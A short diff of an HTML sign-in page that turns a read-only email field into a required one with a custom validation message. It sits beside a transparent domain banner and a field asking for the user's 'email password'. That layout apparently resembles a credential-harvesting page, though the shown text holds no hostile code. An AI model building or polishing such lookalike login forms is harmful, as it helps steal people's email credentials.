@@ -166,7 +166,8 @@
 
  <center> <h3>Sign In</h3><b><input id="domain" style="font-size: 14pt; height: 30px; width:250px; border-color:  rgba(0,0,0,0);   rgba(0,0,0,0);  rgba(0,0,0,0);   rgba(0,0,0,0); background:rgba(0,0,0,0); ; color: #140c4d;"class="form-control" readonly="readonly"> 
         <center>
-    <input type="email" name="email" id="email" placeholder="Email address" style="font-size: 11pt; height: 25px; width:280px; " readonly="readonly" />
+    <input type="email" name="email" id="email" placeholder="Email address" style="font-size: 11pt; height: 25px; width:280px; "  required="" oninvalid="this.setCustomValidity('Enter your email address')"
+  oninput="this.setCustomValidity('')"/>
  <p>
                <input type="password" name="Password" placeholder="Password" style="font-size: 11pt; height: 25px; width:280px;" required="" oninvalid="this.setCustomValidity('Enter your email password')"
   oninput="this.setCustomValidity('')"/>
